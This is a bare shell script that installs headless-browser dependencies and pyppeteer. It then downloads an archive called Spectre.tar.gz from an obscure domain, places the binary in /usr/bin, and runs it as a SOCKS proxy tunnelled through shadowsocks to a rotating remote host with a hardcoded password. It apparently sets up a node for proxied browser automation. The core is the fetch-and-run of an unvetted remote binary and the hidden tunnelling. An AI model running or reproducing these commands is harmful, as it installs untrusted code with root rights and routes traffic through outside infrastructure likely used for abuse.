#!/bin/sh
apt update;apt -y install wget curl net-tools python3 python3-pip
sleep 2
apt -y install ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6  libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release xdg-utils
sleep 2
cat > requirements.txt <<END
numpy
requests
asyncio
pyppeteer
END
sleep 2
pip3 install -r requirements.txt
sleep 2
wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz
sleep 2
tar -xf Spectre.tar.gz
sleep 2
mv Spectre /usr/bin
sleep 2
Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
sleep 2
curl -s -x socks5h://127.0.0.1:1082 api.ipify.org
